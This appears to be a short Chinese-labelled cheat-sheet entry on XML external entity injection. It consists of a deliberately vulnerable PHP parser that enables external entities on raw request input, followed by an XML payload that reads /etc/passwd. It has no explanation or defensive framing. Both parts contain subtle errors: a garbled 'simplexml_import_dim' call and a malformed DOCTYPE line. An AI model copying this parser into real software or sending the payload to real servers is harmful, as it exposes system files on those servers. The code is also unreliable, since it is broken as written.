## 漏洞代码 ：
```
<?php
libxml_disable_entity_loader(false);
$xml=file_get_contents('php://input');
$dom=new DOMdocument();
$dom->loadXML($xml,LIBXML_NOENT|LIBXML_DTDLOAD);
$creds=$simplexml_import_dim($dom);
echo $creds;
```

## Payload
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE creds>[
<!ENTITY goodies SYSTEM "file:///etc/passwd">]>
<creds>&goodies;</creds>
```

